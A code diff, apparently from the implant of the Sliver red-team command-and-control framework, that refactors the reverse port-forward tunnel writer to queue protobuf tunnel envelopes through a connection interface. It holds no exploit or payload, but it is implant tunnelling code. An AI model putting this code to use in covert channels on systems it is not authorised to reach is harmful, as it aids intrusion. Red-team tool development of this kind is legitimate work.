@@ -19,7 +19,6 @@ package rportfwd
 */
 
 import (
-
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
@@ -33,7 +32,7 @@ import (
 // I know the reader/writer stuff is a little hard to keep track of
 type tunnelWriter struct {
 	tun             *transports.Tunnel
-	conn            *transports.Connection
+	conn            tunnelConnection
 	host            string
 	port            uint32
 	protocol        int
@@ -43,34 +42,37 @@ type tunnelWriter struct {
 
 func (tw tunnelWriter) Write(data []byte) (int, error) {
 	n := len(data)
-	sequence := tw.tun.NextWriteSequence()
-	ack := tw.tun.ReadSequence()
-	createReverse := sequence == 0
-	rportfwdInfo := &sliverpb.RPortfwd{}
-	if createReverse {
-		rportfwdInfo.Host = tw.host
-		rportfwdInfo.Port = tw.port
-		rportfwdInfo.Protocol = int32(tw.protocol)
-		rportfwdInfo.TunnelID = tw.tunnelID
-		rportfwdInfo.AuthorizationID = tw.authorizationID
-	}
-	data, err := proto.Marshal(&sliverpb.TunnelData{
-		Sequence:      sequence,
-		Ack:           ack,
-		TunnelID:      tw.tun.ID,
-		Data:          data,
-		CreateReverse: createReverse,
-		Rportfwd:      rportfwdInfo,
+	err := tw.conn.QueueTunnelData(tw.tun, func(sequence uint64, ack uint64) (*sliverpb.Envelope, error) {
+		createReverse := sequence == 0
+		rportfwdInfo := &sliverpb.RPortfwd{}
+		if createReverse {
+			rportfwdInfo.Host = tw.host
+			rportfwdInfo.Port = tw.port
+			rportfwdInfo.Protocol = int32(tw.protocol)
+			rportfwdInfo.TunnelID = tw.tunnelID
+			rportfwdInfo.AuthorizationID = tw.authorizationID
+		}
+		marshaled, marshalErr := proto.Marshal(&sliverpb.TunnelData{
+			Sequence:      sequence,
+			Ack:           ack,
+			TunnelID:      tw.tun.ID,
+			Data:          data,
+			CreateReverse: createReverse,
+			Rportfwd:      rportfwdInfo,
+		})
+		// {{if .Config.Debug}}
+		log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, sequence, ack)
+		// {{end}}
+		if marshalErr != nil {
+			return nil, marshalErr
+		}
+		return &sliverpb.Envelope{
+			Type: sliverpb.MsgTunnelData,
+			Data: marshaled,
+		}, nil
 	})
-	// {{if .Config.Debug}}
-	log.Printf("[tunnelWriter] Write %d bytes (write seq: %d) ack: %d", n, sequence, ack)
-	// {{end}}
 	if err != nil {
 		return 0, err
-	}
-	tw.conn.Send <- &sliverpb.Envelope{
-		Type: sliverpb.MsgTunnelData,
-		Data: data,
 	}
 	return n, nil
 }
